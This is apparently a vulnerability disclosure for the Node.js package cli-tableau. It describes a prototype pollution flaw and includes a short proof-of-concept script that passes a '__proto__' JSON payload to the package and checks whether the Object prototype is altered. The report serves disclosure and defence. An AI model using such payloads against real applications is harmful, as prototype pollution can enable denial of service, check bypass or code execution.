## description
cli-tableau is a pretty unicode table for the CLI with Node.JS.

cli-tableau is vulnerable to Prototype Pollution. The utilities function allows modification of the Object prototype. 
If an attacker can control part of the structure passed to this function, they could add or modify an existing property.
Possibly leading to many kinds of attacks such as the denial-of-service, checking bypass, or potentially code execution.

## PoC
Run the PoC.js with the contents below:

//PoC.js

var cli = require('cli-tableau');

var payload = '{"__proto__":{"polluted":"pzhou@shu"}}';
//var payload = '{"constructor":{"prototype":{"polluted":"pzhou@shu"}}}';

console.log('Before:', {}.polluted);

cli(JSON.parse(payload));

console.log('After:', {}.polluted);

//end of PoC.js
